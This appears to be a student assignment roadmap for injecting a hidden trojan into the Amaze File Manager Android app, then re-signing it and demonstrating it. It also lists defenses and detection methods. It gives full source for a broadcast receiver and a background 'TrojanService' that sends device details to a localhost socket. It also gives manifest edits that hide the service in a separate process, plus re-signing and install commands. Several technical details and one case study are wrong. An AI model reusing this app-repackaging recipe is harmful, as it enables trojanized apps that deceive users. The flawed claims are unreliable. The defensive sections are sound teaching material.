# QUICK ACTION PLAN - EXECUTION ROADMAP

## PHASE 1: REVERSE ENGINEERING (Days 1-7)

### Day 1-2: Setup & Extraction
```bash
# Create project structure
mkdir -p ~/mobile_security/amaze
cd ~/mobile_security/amaze

# Extract APK (it's a ZIP file)
unzip Amaze_File_Manager.apk -d extracted/

# Verify contents
ls -la extracted/
# Expected: AndroidManifest.xml, classes.dex, classes2.dex, res/, assets/
```

**Deliverable**: Extracted APK files ready for analysis

---

### Day 3-4: Decompilation
```bash
# Option 1: Online tool
# Visit: https://decompiler.com/
# Upload: Amaze_File_Manager.apk
# Download: Decompiled files

# Option 2: Command line (if Java available)
# Download apktool from github releases
java -jar apktool.jar d Amaze_File_Manager.apk -o amaze_decompiled/
```

**Deliverable**: `amaze_decompiled/` folder with readable code structure

---

### Day 5: Manifest Analysis
Read and document `AndroidManifest.xml`:

```xml
Key things to find and document:

1. PACKAGE NAME:
   <manifest xmlns:android="..."
      package="com.amaze.filemanager">  ← Package name here

2. ACTIVITIES (count them):
   <application>
       <activity android:name="com.amaze.filemanager.ui.activities.MainActivity">
       <activity android:name="com.amaze.filemanager.ui.activities.SettingsActivity">
       ... more activities ...

3. SERVICES (count them):
   <service android:name="com.amaze.filemanager.services.ExtractService"/>
   <service android:name="com.amaze.filemanager.services.SftpService"/>
   ... more services ...

4. BROADCAST RECEIVERS (count them):
   <receiver android:name="com.amaze.filemanager.receivers.BootReceiver">
   ... more receivers ...

5. PERMISSIONS (list them all):
   <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
   <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
   <uses-permission android:name="android.permission.INTERNET"/>
   ... more permissions ...

6. MIN/TARGET SDK:
   <uses-sdk android:minSdkVersion="X" android:targetSdkVersion="Y"/>
```

**Deliverable**: Complete manifest analysis document

---

### Day 6: Code Analysis
Examine DEX files (the actual app code):

```bash
# Convert to JAR for easier viewing
d2j-dex2jar extracted/classes.dex -o classes-dex2jar.jar
d2j-dex2jar extracted/classes2.dex -o classes2-dex2jar.jar

# Open with JD-GUI or similar tool to view Java code
# Look for:
# - MainActivity class (entry point)
# - Service implementations (ExtractService, etc.)
# - Network communication code
# - Permission checks
# - Any hardcoded URLs, keys, credentials
```

**Deliverable**: Code analysis notes, key findings documented

---

### Day 7: Write Phase 1 Report

**Report Structure (MUST FOLLOW THIS):**

```markdown
# PHASE 1: REVERSE ENGINEERING REPORT

## 1.1 Executive Summary
[2-3 sentences about what you found]

## 1.2 APK Structure
[Describe extracted structure]
- AndroidManifest.xml: [size, purpose]
- classes.dex, classes2.dex: [size, contains Java code]
- resources.arsc: [size, contains resources]
- res/: [layout files, drawable files, etc.]
- lib/: [native libraries]

## 1.3 Package Information
- Package Name: com.amaze.filemanager
- Minimum SDK: [version]
- Target SDK: [version]

## 1.4 Component Inventory
### Activities (User Interface)
| Activity Name | Purpose | Exported |
|---|---|---|
| MainActivity | File browser UI | Yes |
| SettingsActivity | Settings UI | No |
| [List all found] | | |

### Services (Background Operations)
| Service Name | Purpose |
|---|---|
| ExtractService | Extract archives |
| [List all found] | |

### Broadcast Receivers (Event Listeners)
| Receiver Name | Listens For |
|---|---|
| BootReceiver | Device boot |
| [List all found] | |

## 1.5 Permissions Analysis
### Internet Permissions
- android.permission.INTERNET: [Explain why app needs it]
- android.permission.ACCESS_NETWORK_STATE: [Explain]

### File Access Permissions
- android.permission.READ_EXTERNAL_STORAGE: [Explain]
- android.permission.WRITE_EXTERNAL_STORAGE: [Explain]

[List all permissions with explanations]

## 1.6 Application Flow
[Describe how app works when user launches it]

Step 1: User clicks Amaze icon
Step 2: MainActivity opens
Step 3: App requests file permissions
Step 4: Shows file browser
Step 5: User can navigate files, extract archives, etc.

## 1.7 Security Analysis
### Findings
- [Hardcoded credentials found? No/Describe]
- [Network endpoints found? Describe]
- [Anti-tampering mechanisms? Describe]
- [Vulnerable components? Describe]

### Risk Assessment
- Overall risk level: [LOW/MEDIUM/HIGH]
- Justification: [Explain why]

## 1.8 Conclusion
[Summary of reverse engineering findings]

## Appendix A: Screenshots
[Include screenshots of decompiled code, manifest, etc.]
```

**Deliverable**: Complete Phase 1 report (PDF)

---

---

## PHASE 2: MALWARE INJECTION (Days 8-14)

### Day 8-9: Design & Planning

**Decision 1: Choose TRIGGER**
```
✅ Easy triggers:
- App Launch (EASIEST - runs when Amaze starts)
- Connectivity Change (runs when WiFi/data changes)

🟡 Medium triggers:
- Boot Complete (runs when device boots)
- File Selection (runs when user opens a file)

❌ Skip:
- Time-based (harder to verify in viva)
- Specific user interaction (hard to trigger reliably)
```

**Recommendation**: Choose "App Launch" for reliability

**Decision 2: Choose MALICIOUS ACTION**
```
✅ Best for demonstration:
- Simulated data exfiltration to localhost:8888
  (IMPRESSIVE - shows network activity, easy to prove)

✅ Good alternatives:
- Background CPU spike (30 seconds of heavy calculation)
- Unauthorized notification (shows up on screen)

✅ Alternative:
- Device information logging to file (proves execution)
```

**Recommendation**: Choose "Simulated data exfiltration" - most impressive for viva

---

### Day 10: Write TriggerReceiver.java

```java
// File: TriggerReceiver.java
// This listens for events and starts the malicious service

package com.example.malware;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

/**
 * This receiver listens for app launch events
 * When triggered, it starts the malicious service
 */
public class TriggerReceiver extends BroadcastReceiver {
    private static final String TAG = "TriggerReceiver";
    
    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d(TAG, "Broadcast received! Starting malicious service...");
        
        // Create intent to start malicious service
        Intent serviceIntent = new Intent(context, TrojanService.class);
        
        // Start the service
        context.startService(serviceIntent);
        
        Log.d(TAG, "Service start request sent");
    }
}
```

**Deliverable**: TriggerReceiver.java file

---

### Day 11: Write TrojanService.java

```java
// File: TrojanService.java
// This is the actual malicious service

package com.example.malware;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.os.Build;
import android.util.Log;
import java.io.*;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.Date;

/**
 * This service performs simulated data exfiltration
 * Connects to localhost:8888 and "uploads" device info
 */
public class TrojanService extends Service {
    private static final String TAG = "TrojanService";
    private static final String LOG_FILE = "trojan_activity.log";
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "=== MALICIOUS SERVICE STARTED ===");
        logActivity("Service started");
        
        // Run in separate thread to avoid blocking UI
        new Thread(() -> {
            try {
                Thread.sleep(2000); // Wait 2 seconds
                performExfiltration();
            } catch (Exception e) {
                Log.e(TAG, "Error: " + e.getMessage());
                logActivity("Error: " + e.getMessage());
            }
        }).start();
        
        // Return START_STICKY so service restarts if killed
        return START_STICKY;
    }
    
    /**
     * Performs simulated data exfiltration
     * Attempts to connect to localhost:8888
     */
    private void performExfiltration() {
        Log.d(TAG, "Starting data exfiltration...");
        logActivity("Exfiltration attempt initiated");
        
        try {
            // Gather simulated device information
            String deviceInfo = gatherDeviceInfo();
            
            // Try to connect to localhost server
            Log.d(TAG, "Connecting to 127.0.0.1:8888...");
            Socket socket = new Socket("127.0.0.1", 8888);
            
            // Write device info to socket
            OutputStream out = socket.getOutputStream();
            out.write(deviceInfo.getBytes());
            out.flush();
            
            Log.d(TAG, "Data sent successfully!");
            logActivity("Data exfiltration successful");
            
            socket.close();
            
        } catch (Exception e) {
            // Connection will fail (no server running), but that's OK for demo
            Log.d(TAG, "Connection failed (expected): " + e.getMessage());
            logActivity("Exfiltration failed (no server): " + e.getMessage());
            
            // In real attack, would retry or use alternate method
        }
    }
    
    /**
     * Gathers simulated device information
     * Does NOT access real user data
     */
    private String gatherDeviceInfo() {
        StringBuilder info = new StringBuilder();
        info.append("=== SIMULATED DEVICE INFO (FOR EDUCATION ONLY) ===\n");
        info.append("Device: ").append(Build.DEVICE).append("\n");
        info.append("Model: ").append(Build.MODEL).append("\n");
        info.append("Manufacturer: ").append(Build.MANUFACTURER).append("\n");
        info.append("Android Version: ").append(Build.VERSION.RELEASE).append("\n");
        info.append("API Level: ").append(Build.VERSION.SDK_INT).append("\n");
        info.append("Build ID: ").append(Build.ID).append("\n");
        info.append("Timestamp: ").append(new Date()).append("\n");
        info.append("Simulated IMEI: ").append(generateFakeIMEI()).append("\n");
        
        Log.d(TAG, "Device info: " + info.toString());
        return info.toString();
    }
    
    /**
     * Generates a fake IMEI (NOT real device IMEI)
     * For demonstration purposes only
     */
    private String generateFakeIMEI() {
        return "SIMULATED-IMEI-" + System.currentTimeMillis();
    }
    
    /**
     * Logs activity to file for proof of execution
     */
    private void logActivity(String message) {
        try {
            File logDir = getExternalFilesDir(null);
            if (logDir != null) {
                File logFile = new File(logDir, LOG_FILE);
                
                FileWriter fw = new FileWriter(logFile, true); // Append mode
                String timestamp = new SimpleDateFormat("HH:mm:ss").format(new Date());
                fw.write("[" + timestamp + "] " + message + "\n");
                fw.close();
                
                Log.d(TAG, "Logged to file: " + logFile.getAbsolutePath());
            }
        } catch (IOException e) {
            Log.e(TAG, "Failed to write log: " + e.getMessage());
        }
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "Service destroyed");
        logActivity("Service destroyed");
    }
}
```

**Deliverable**: TrojanService.java file

---

### Day 12: Modify AndroidManifest.xml

Find the closing `</manifest>` tag and ADD these BEFORE it:

```xml
<!-- ADD THESE PERMISSIONS -->
<uses-permission android:name="android.permission.INTERNET"/>
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
<uses-permission android:name="android.permission.CHANGE_NETWORK_STATE"/>
<uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>

<!-- Inside <application> tag, ADD THESE: -->

<!-- Malicious Service -->
<service
    android:name="com.example.malware.TrojanService"
    android:enabled="true"
    android:exported="false"
    android:process=":trojan"
    android:description="@string/app_name" />

<!-- Trigger Receiver (listens for app launch) -->
<receiver
    android:name="com.example.malware.TriggerReceiver"
    android:enabled="true"
    android:exported="true">
    
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
    
    <intent-filter>
        <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
    </intent-filter>
</receiver>
```

**What each attribute means:**
- `android:name`: Full class name of component
- `android:enabled="true"`: Component is active
- `android:exported="false"`: Service cannot be accessed by other apps (hidden)
- `android:process=":trojan"`: Runs in separate process (more hidden)
- `android:exported="true"` (receiver): Can receive broadcasts from system

**Deliverable**: Modified AndroidManifest.xml

---

### Day 13: Compile & Inject

```bash
# Copy your Java files to the decompiled APK
# Find where to put them:
mkdir -p amaze_decompiled/smali/com/example/malware

# Option 1: Use smali compiler to convert Java to smali
# (More complex, requires smali tool)

# Option 2: Use APK editor online
# Visit: https://www.apk-editor.com/
# 1. Open APK
# 2. Add files: TriggerReceiver.java, TrojanService.java
# 3. Edit AndroidManifest.xml
# 4. Build/compile
# 5. Download modified APK

# Option 3: Manual recompilation
# This requires multiple steps with proper tools
```

**Recommended**: Use online APK editor (easiest)

**Deliverable**: amaze_modified_unsigned.apk

---

### Day 14: Sign APK

```bash
# STEP 1: Generate debug signing key (one-time)
keytool -genkey -v -keystore debug.keystore \
  -keyalg RSA -keysize 2048 -validity 10000 \
  -alias androiddebugkey \
  -storepass android -keypass android \
  -dname "CN=Android Debug, O=Android, C=US"

# STEP 2: Sign the APK
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 \
  -keystore debug.keystore \
  -storepass android -keypass android \
  amaze_modified_unsigned.apk androiddebugkey

# STEP 3: Verify signature
jarsigner -verify amaze_modified_unsigned.apk

# Output should show:
# "jar verified"

# Rename to signed APK
mv amaze_modified_unsigned.apk amaze_modified_signed.apk
```

**OR use online signer**: https://www.apksigner.com/

**Deliverable**: amaze_modified_signed.apk (ready to install)

---

## PHASE 3: TESTING & EVIDENCE (Days 15-19)

### Day 15: Install & Test

```bash
# Start Android emulator or connect device
adb devices  # Should show connected device

# Install modified APK
adb install amaze_modified_signed.apk

# Verify installation
adb shell pm list packages | grep amaze
# Output: com.amaze.filemanager

# Launch app
adb shell am start -n com.amaze.filemanager/.MainActivity
```

**Verification:**
- ✅ App installs without errors
- ✅ App launches normally
- ✅ File manager works (can browse files)
- ✅ No crashes

---

### Day 16-17: Test Trigger & Execute

```bash
# Open Android Monitor to see logs
adb logcat | grep -E "TrojanService|TriggerReceiver"

# Method 1: Trigger by changing connectivity
# In emulator: Click More → Cellular → Toggle off/on
# Watch for log messages:
# D TriggerReceiver: Broadcast received! Starting malicious service
# D TrojanService: === MALICIOUS SERVICE STARTED ===
# D TrojanService: Starting data exfiltration...

# Method 2: Check if log file created
adb shell ls -la /sdcard/Android/data/com.amaze.filemanager/files/

# Should see: trojan_activity.log

# Read log file
adb shell cat /sdcard/Android/data/com.amaze.filemanager/files/trojan_activity.log

# Output will show:
# [HH:MM:SS] Service started
# [HH:MM:SS] Exfiltration attempt initiated
# [HH:MM:SS] Exfiltration failed (no server): [reason]
```

**Proof of Execution:**
- Service started: ✅ Log shows it
- Service executed: ✅ Log file created
- No real data stolen: ✅ Only simulated info

---

### Day 18: Take Screenshots

Create folder: `~/screenshots/`

**Screenshot 1: Installation**
```bash
adb shell pm list packages | grep amaze
# Screenshot output showing package installed
```

**Screenshot 2: App Running Normally**
```bash
# Take screenshot of file manager
adb shell screencap -p /sdcard/amaze_running.png
adb pull /sdcard/amaze_running.png screenshots/
```

**Screenshot 3: Logcat Output**
```bash
# Screenshot showing service startup logs
adb logcat | grep TrojanService
```

**Screenshot 4: Modified Manifest**
```
Open amaze_decompiled/AndroidManifest.xml in text editor
Take screenshot showing:
- New <service> declaration
- New <receiver> declaration
- New permissions
```

**Screenshot 5: Original vs Modified Comparison**
```
Show side-by-side:
- Original manifest snippet
- Modified manifest snippet
- Highlight differences
```

**Screenshot 6: Log File Contents**
```bash
adb shell cat /sdcard/Android/data/com.amaze.filemanager/files/trojan_activity.log
# Screenshot showing the log output
```

**Screenshot 7: Source Code**
```
Open TrojanService.java in text editor
Screenshot showing:
- onStartCommand() method
- performExfiltration() method
- Comments explaining what each does
```

---

### Day 19: Record Video Demonstration

**Video Script (5-10 minutes):**

```
[00:00-00:30] INTRO
"This is the demonstration of the malicious service injection.
I have successfully reverse engineered the Amaze File Manager APK,
injected a hidden background service, and I'm now going to show
you proof of it executing."

[00:30-01:00] INSTALLATION
"First, I'll install the modified APK on the Android emulator.
Here I'm running the adb install command..."
[Show command and output: "Success"]

[01:00-01:30] APP LAUNCH
"Now I launch the Amaze File Manager app. Notice it opens normally
and all original functionality works. The malicious service is
running completely hidden in the background."
[Show app opening and file browsing]

[01:30-03:00] TRIGGER & EXECUTION
"Now I'll trigger the malicious service. I'll change the device
connectivity to trigger the broadcast receiver I injected."
[Show WiFi toggle or connectivity change]

"Watch the Android Monitor logcat output. Here we can see:
1. 'TriggerReceiver: Broadcast received!'
2. 'TrojanService: === MALICIOUS SERVICE STARTED ==='
3. 'TrojanService: Starting data exfiltration...'

This proves the service is executing exactly as designed."
[Show logcat with these messages highlighted]

[03:00-04:00] PROOF OF EXECUTION
"Now I'll show you the proof that the service executed.
I'll navigate to the app's log file directory..."
[Show: adb shell ls -la /sdcard/Android/data/com.amaze.filemanager/files/]

"And here's the trojan_activity.log file that proves execution."
[Show: adb shell cat trojan_activity.log]

Output shows:
[HH:MM:SS] Service started
[HH:MM:SS] Exfiltration attempt initiated
[HH:MM:SS] Exfiltration failed (no server): [reason]

This proves the service attempted to exfiltrate data to localhost:8888."

[04:00-05:00] CODE REVIEW
"Let me show you the actual code that's running.
Here's the TriggerReceiver that listens for events..."
[Show source code with annotations]

"And here's the TrojanService that performs the exfiltration..."
[Show source code with annotations]

"As you can see, this is a controlled educational demonstration
of how malware works and how to defend against it."

[05:00] CONCLUSION
"This completes the demonstration. The modified APK successfully:
1. Maintains original app functionality
2. Hides a malicious service
3. Executes on trigger (connectivity change)
4. Performs simulated data exfiltration
5. Logs all activity for proof

All of this is done in a controlled environment for educational purposes only."
```

**Recording Tips:**
- Use OBS Studio (free) or screen recording tool
- Clear desktop first
- Practice once, then record
- Speak clearly and slowly
- Minimize background noise
- Keep video focused and relevant

**Deliverable**: demonstration_video.mp4 (5-10 minutes)

---

## PHASE 4: DOCUMENTATION (Days 20-21)

### Day 20-21: Write Phase 2 & Phase 3 Reports

**Phase 2 Report Structure:**

```markdown
# PHASE 2: MALWARE INJECTION REPORT

## 2.1 Overview
[Brief description of what you injected and why]

## 2.2 Trigger Mechanism Design
- **Chosen Trigger**: App Launch / Connectivity Change
- **Why This Trigger**: [Explain]
  - Easy to demonstrate
  - Reliable (happens every time)
  - Difficult to detect
- **How It Works**: [Explain the broadcast receiver]

## 2.3 Malicious Action Design
- **Chosen Action**: Simulated Data Exfiltration
- **Why This Action**: [Explain]
  - Demonstrates network activity
  - Easy to log and prove
  - Realistic (similar to real malware)
- **What Data**: Only simulated/non-real data
  - No real user files accessed
  - No real credentials stolen

## 2.4 Implementation Details

### 2.4.1 TriggerReceiver Class
[Show complete source code]

What it does:
- Listens for broadcasts (app launch, connectivity changes)
- When triggered, starts the malicious service
- Completely transparent to user

### 2.4.2 TrojanService Class
[Show complete source code]

What it does:
- Runs in background (separate process)
- Gathers simulated device information
- Attempts connection to localhost:8888
- Logs all activity to file
- Stays running (START_STICKY)

### 2.4.3 Manifest Modifications
[Show diff - before and after]

Added permissions:
- android.permission.INTERNET
- android.permission.ACCESS_NETWORK_STATE
- android.permission.CHANGE_NETWORK_STATE
- android.permission.POST_NOTIFICATIONS

Added components:
- Service: TrojanService (in separate process)
- Receiver: TriggerReceiver (exported to receive broadcasts)

## 2.5 Compilation & Signing Process
[Explain step-by-step]

1. Decompile original APK
2. Add Java source files to smali directory
3. Modify AndroidManifest.xml with new permissions and components
4. Compile with apktool: apktool b [directory]
5. Sign APK: jarsigner command
6. Verify signature

## 2.6 Injection Verification

### Manifest Verification
[Show that new entries are in final APK]

```bash
unzip amaze_modified_signed.apk AndroidManifest.xml
# Confirm new <service> and <receiver> entries present
```

### Component Verification
[Show that components are registered]

```bash
adb shell dumpsys package com.amaze.filemanager
# Output shows:
#   Service com.example.malware.TrojanService
#   Receiver com.example.malware.TriggerReceiver
```

## 2.7 Testing Results
[Summarize what you tested]

✅ APK Installs: Yes
✅ App Launches: Yes
✅ Original Functionality: Works normally
✅ Service Activates: Yes (confirmed via logcat)
✅ Execution Logs: Yes (trojan_activity.log created)

## 2.8 Challenges & Solutions
[Describe any problems and how you solved them]

Challenge: Tool X not working
Solution: Used online tool Y instead

[Repeat for each challenge]

## 2.9 Conclusion
[Summary of injection success]
```

**Phase 3 Report Structure:**

```markdown
# PHASE 3: SECURITY ANALYSIS & DEFENSE

## 3.1 Attack Analysis

### 3.1.1 Attack Flow
[Describe step-by-step how this attack works]

1. Attacker decompiles legitimate app
2. Reverse engineers app structure
3. Identifies where to inject malicious code
4. Writes service and receiver classes
5. Modifies manifest with new permissions
6. Recompiles and re-signs APK
7. Distributes via third-party app store / APK file
8. User installs thinking it's legitimate
9. Malicious service runs in background
10. On trigger, executes attack (data theft, etc.)
11. Covers tracks (uses hidden permissions, separate process)

### 3.1.2 Why This Attack Works
- User can't see hidden service
- Service runs even when app is closed
- Manifest obfuscation makes it hard to detect
- Broadcast receiver auto-activates service
- Separate process hides from task list

### 3.1.3 Real-World Impact
- Data theft (files, photos, messages)
- Credential harvesting
- Ransomware infection
- Botnet participation
- Spying on user

---

## 3.2 DEFENSE 1: Code Obfuscation

### What is it?
Making decompiled code unreadable so attackers can't understand it

### How it works
```
BEFORE obfuscation:
class MainActivity {
    void showFileList() { ... }
    void deleteFile() { ... }
}

AFTER obfuscation:
class a {
    void b() { ... }
    void c() { ... }
}
```

### How to implement (Android)
```gradle
// In build.gradle
android {
    buildTypes {
        release {
            minifyEnabled true
            proguardFiles getDefaultProguardFile(
                'proguard-android-optimize.txt'), 'proguard-rules.pro'
        }
    }
}

// In proguard-rules.pro
-keep class com.amaze.filemanager.** { *; }
-keepclassmembers class * {
    *** onReceive(...);
}
```

### Limitations
- Determined attacker can still deobfuscate
- Only makes reverse engineering harder, not impossible

---

## 3.3 DEFENSE 2: Anti-Tampering Checks

### What is it?
Verify at runtime that the app hasn't been modified

### Implementation
```java
public class SecurityChecker {
    // Expected SHA-256 hash of legitimate APK
    private static final String EXPECTED_APK_HASH = 
        "abc123def456...";
    
    public boolean isAppTampered(Context context) {
        // Get current APK signature
        PackageInfo info = context.getPackageManager()
            .getPackageInfo(context.getPackageName(), 
                PackageManager.GET_SIGNATURES);
        
        // Calculate hash of current APK
        String currentHash = calculateSHA256(
            info.signatures[0].toByteArray());
        
        // Compare with expected hash
        if (!currentHash.equals(EXPECTED_APK_HASH)) {
            Log.e("Security", "APK has been tampered with!");
            // Could:
            // - Refuse to run
            // - Alert user
            // - Send alert to server
            // - Deactivate features
            return true;
        }
        return false;
    }
    
    private String calculateSHA256(byte[] data) {
        MessageDigest digest = MessageDigest.getInstance("SHA-256");
        byte[] hash = digest.digest(data);
        return bytesToHex(hash);
    }
}

// Call at app startup
if (isAppTampered(context)) {
    throw new SecurityException("App integrity check failed");
}
```

### How this prevents attack
- Our injection modifies the APK
- Hash changes → tampered app detected
- App refuses to run

### Limitations
- Attacker could remove the check code
- Only works if check is done before attack can execute

---

## 3.4 DEFENSE 3: Manifest Integrity Verification

### What is it?
Verify that manifest hasn't been modified

### Implementation
```java
public class ManifestVerifier {
    // Expected hash of AndroidManifest.xml
    private static final String EXPECTED_MANIFEST_HASH = 
        "xyz789...";
    
    public boolean isManifestValid(Context context) {
        try {
            // Extract manifest from APK
            ApplicationInfo appInfo = 
                context.getPackageManager().getApplicationInfo(
                    context.getPackageName(), 0);
            String apkPath = appInfo.publicSourceDir;
            
            ZipFile apk = new ZipFile(apkPath);
            ZipEntry manifestEntry = 
                apk.getEntry("AndroidManifest.xml");
            InputStream is = apk.getInputStream(manifestEntry);
            
            // Calculate hash
            String currentHash = calculateHash(is);
            
            // Verify
            if (!currentHash.equals(EXPECTED_MANIFEST_HASH)) {
                Log.e("Security", 
                    "Manifest has been modified!");
                return false;
            }
            return true;
        } catch (Exception e) {
            Log.e("Security", "Manifest check failed: " + e);
            return false;
        }
    }
}
```

### How this prevents attack
- We modify manifest (add service, receiver, permissions)
- Hash changes → modification detected
- App refuses to run

---

## 3.5 DEFENSE 4: Component Whitelisting

### What is it?
Verify only expected services/receivers are present

### Implementation
```java
public class ComponentVerifier {
    private static final Set<String> LEGITIMATE_SERVICES = 
        new HashSet<>(Arrays.asList(
            "com.amaze.filemanager.services.ExtractService",
            "com.amaze.filemanager.services.SftpService"
            // Expected services only
        ));
    
    private static final Set<String> LEGITIMATE_RECEIVERS = 
        new HashSet<>(Arrays.asList(
            "com.amaze.filemanager.receivers.BootReceiver"
            // Expected receivers only
        ));
    
    public boolean verifyComponents(Context context) {
        try {
            PackageInfo info = context.getPackageManager()
                .getPackageInfo(context.getPackageName(), 
                    PackageManager.GET_SERVICES | 
                    PackageManager.GET_RECEIVERS);
            
            // Check services
            for (ServiceInfo service : info.services) {
                if (!LEGITIMATE_SERVICES.contains(
                    service.name)) {
                    Log.e("Security", 
                        "Unauthorized service: " + 
                        service.name);
                    return false;
                }
            }
            
            // Check receivers
            for (ActivityInfo receiver : info.receivers) {
                if (!LEGITIMATE_RECEIVERS.contains(
                    receiver.name)) {
                    Log.e("Security", 
                        "Unauthorized receiver: " + 
                        receiver.name);
                    return false;
                }
            }
            
            return true;
        } catch (Exception e) {
            Log.e("Security", "Component check failed: " + e);
            return false;
        }
    }
}
```

### How this prevents attack
- Our injected service: com.example.malware.TrojanService
- Not in whitelist → rejected
- App refuses to run

---

## 3.6 DEFENSE 5: Permission Audit

### What is it?
Flag unexpected permission usage

### Implementation
```java
public class PermissionAuditor {
    private static final Set<String> EXPECTED_PERMISSIONS = 
        new HashSet<>(Arrays.asList(
            "android.permission.READ_EXTERNAL_STORAGE",
            "android.permission.WRITE_EXTERNAL_STORAGE",
            "android.permission.INTERNET"
            // List expected permissions only
        ));
    
    public void auditPermissions(Context context) {
        try {
            PackageInfo info = context.getPackageManager()
                .getPackageInfo(context.getPackageName(), 
                    PackageManager.GET_PERMISSIONS);
            
            for (String perm : info.requestedPermissions) {
                if (!EXPECTED_PERMISSIONS.contains(perm)) {
                    Log.w("Security", 
                        "Unexpected permission: " + perm);
                    // Could disable app, alert user, etc.
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

### How this prevents attack
- We add: android.permission.CHANGE_NETWORK_STATE
- Not in whitelist → flagged as suspicious
- User alerted or app disabled

---

## 3.7 DEFENSE 6: Runtime Monitoring

### Service Monitoring
```java
// Monitor background services
ActivityManager am = (ActivityManager) 
    context.getSystemService(Context.ACTIVITY_SERVICE);
List<ActivityManager.RunningServiceInfo> services = 
    am.getRunningServices(Integer.MAX_VALUE);

for (ActivityManager.RunningServiceInfo service : services) {
    if (!LEGITIMATE_SERVICES.contains(
        service.service.getClassName())) {
        Log.w("Security", "Unknown service running: " + 
            service.service.getClassName());
    }
}
```

### Permission Usage Monitoring
```java
// Monitor permission usage via ACCESS_FINE_LOCATION, 
// RECORD_AUDIO, etc.
// Use Package Usage Stats for detailed monitoring
```

---

## 3.8 DEFENSE 7: Secure Coding Practices

### Input Validation
```java
// WRONG: Trust user input
void openFile(String filename) {
    File file = new File(filename);
    // Could be: ../../../etc/passwd
}

// RIGHT: Validate path
void openFile(String filename) {
    if (!isValidPath(filename)) {
        throw new SecurityException("Invalid path");
    }
    File file = new File(filename);
}

private boolean isValidPath(String path) {
    File file = new File(path);
    // Check it's within expected directory
    return file.getAbsolutePath().startsWith(
        getFilesDir().getAbsolutePath());
}
```

### No Hardcoded Credentials
```java
// WRONG
private static final String API_KEY = "sk-12345678";

// RIGHT
// Store in secure preference, retrieve at runtime
SharedPreferences prefs = context.getSharedPreferences(
    "secure", Context.MODE_PRIVATE);
String apiKey = prefs.getString("api_key", "");
```

### Exception Handling
```java
// WRONG: Ignore exceptions
try {
    // code
} catch (Exception e) {
    // Silently ignore
}

// RIGHT: Handle properly
try {
    // code
} catch (SocketException e) {
    Log.w("Network", "Connection error", e);
    // Retry or fallback
} catch (Exception e) {
    Log.e("Error", "Unexpected error", e);
    throw new RuntimeException("Critical error", e);
}
```

---

## 3.9 USER PROTECTION STRATEGIES

### For End Users (Protection Against This Attack)

1. **Only Install from Trusted Sources**
   - Google Play Store (has scanning)
   - Official app websites
   - Avoid third-party app stores

2. **Check Permissions Before Installing**
   - Why does file manager need INTERNET permission?
   - Why does calendar need LOCATION permission?
   - Reject if permissions seem excessive

3. **Keep OS Updated**
   - Security patches close vulnerabilities
   - Android updates include malware definitions

4. **Use Mobile Security Software**
   - Antivirus apps scan for malicious behavior
   - Real-time protection monitors running services
   - Examples: McAfee, Norton, Kaspersky

5. **Monitor Installed Apps**
   - Regularly review installed apps
   - Check unknown apps in Settings > Apps
   - Uninstall anything suspicious

6. **Watch for Suspicious Behavior**
   - Unexpected network activity
   - High battery drain
   - Excessive CPU usage
   - Slow performance
   - Unexpected permissions requests

7. **Enable Developer Options**
   - Settings > Developer Options > USB Debugging
   - Use tools to monitor app behavior
   - Check logcat for suspicious messages

---

## 3.10 DETECTION METHODS

### By Security Researchers

#### Method 1: Static Analysis
```bash
# Decompile APK
apktool d suspicious.apk

# Search for suspicious patterns
grep -r "\.TrojanService\|\.TriggerReceiver\|malware" .

# Check for obfuscated code
grep -r "com\.example\|com\.test" AndroidManifest.xml

# Look for suspicious permissions
grep "INTERNET\|ACCESS_FINE_LOCATION" AndroidManifest.xml
```

#### Method 2: Dynamic Analysis
```bash
# Start emulator with monitoring
adb logcat -v threadtime > logs.txt

# Install and run APK
adb install suspicious.apk
adb shell am start -n package/activity

# Monitor in real-time
adb logcat | grep -E "ServiceManager|startService"

# Check network connections
tcpdump -i any -n 'tcp or udp'

# Monitor processes
adb shell ps -A | watch
```

#### Method 3: Automated Tools
- **MobSF**: Mobile Security Framework
- **Androguard**: Reverse engineering tool
- **Frida**: Runtime instrumentation
- **Virus Total**: Online scanning (70+ antivirus)

### Expected Detection Results for Our Malware
```
MobSF Analysis:
- [CRITICAL] Unauthorized service declared: TrojanService
- [HIGH] Network access without explanation
- [HIGH] INTERNET permission + data exfiltration pattern
- [MEDIUM] Suspicious process name: :trojan
- [MEDIUM] Hidden component: exported=false + intent-filter
```

---

## 3.11 REAL-WORLD EXAMPLES

### Case Study 1: XcodeGhost (2015)
- What: Modified Xcode (Apple's IDE) with malware
- Impact: 40+ popular apps infected
- Detection: Submitted apps to App Store
- Lesson: Supply chain attacks are a threat

### Case Study 2: SonicSpy (2016)
- What: Legitimate app tweaked to spy on users
- Impact: Photos, messages, contacts stolen
- Detection: Anomalous network traffic
- Lesson: Always verify app integrity

### Case Study 3: HiddenCobra (Ongoing)
- What: Google Play apps repackaged with malware
- Impact: Hundreds of thousands infected
- Detection: Antivirus/MobSF scanning
- Lesson: Even Play Store has risks

---

## 3.12 CONCLUSION

This assignment demonstrates:

✅ **Vulnerability**: Apps CAN be easily modified without developer knowledge

✅ **Importance of Defense**: Multiple layers needed to prevent attacks

✅ **Security is Hard**: No single perfect defense

✅ **Education Value**: Understanding attacks → Building better defenses

✅ **Responsibility**: Powerful knowledge requires ethical use

The techniques learned here are used by:
- ✅ Security researchers (defense)
- ✅ Malware analysts (detection)
- ✅ App developers (hardening)
- ❌ BUT NOT for real attacks (illegal & unethical)

---

## Appendix A: All Defense Code Examples
[Include all code snippets in one place for reference]

## Appendix B: Tool Reference
[List of tools and their usage]

## Appendix C: Screenshots
